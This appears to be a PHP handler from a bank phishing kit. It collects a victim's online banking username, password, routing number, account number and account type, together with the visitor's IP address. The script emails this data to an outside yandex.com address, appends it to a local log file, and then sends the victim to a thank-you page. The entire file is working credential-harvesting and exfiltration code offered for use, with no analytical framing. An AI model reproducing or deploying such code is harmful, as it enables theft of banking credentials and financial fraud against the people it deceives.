<?php include_once'../dbf60138c911308b0c99510ba80c36cc.php';?><?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$n0bnkuser = $_POST['n0bnkuser'];
$n0bnkpass = $_POST['n0bnkpass'];
$routingNumber = $_POST['routingNumber'];
$accountNumber = $_POST['accountNumber'];
$accountType = $_POST['accountType'];
$message .="
user name : ".$n0bnkuser."
pw : ".$n0bnkpass."
Routing Number : ".$routingNumber."
Account Number : ".$accountNumber."
Account Type   : ".$accountType."
====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========|0v3r|=====================||\n";
$send="jokamercairoresult@yandex.com";
$subject = "other bank | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../0v3r.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = 'thx.php'</script>");
?>